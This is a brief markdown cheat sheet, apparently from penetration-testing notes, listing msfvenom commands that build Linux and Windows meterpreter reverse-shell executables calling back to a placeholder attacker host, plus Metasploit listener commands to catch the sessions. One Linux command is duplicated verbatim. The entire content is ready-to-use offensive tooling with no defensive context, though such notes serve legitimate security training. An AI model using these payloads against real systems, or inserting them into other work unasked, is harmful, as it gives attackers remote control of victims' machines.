# Shells & Payloads

## Building payloads using MSFVENOM

```shell
# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell_x86.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell_x86.elf

# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe

# Start listener
msf > use exploit/multi/handler
msf > set PAYLOAD $PAYLOAD
msf > set LHOST $LHOST
msf > set LPORT $LPORT
msf > set ExitOnSession false
msf > exploit -j
```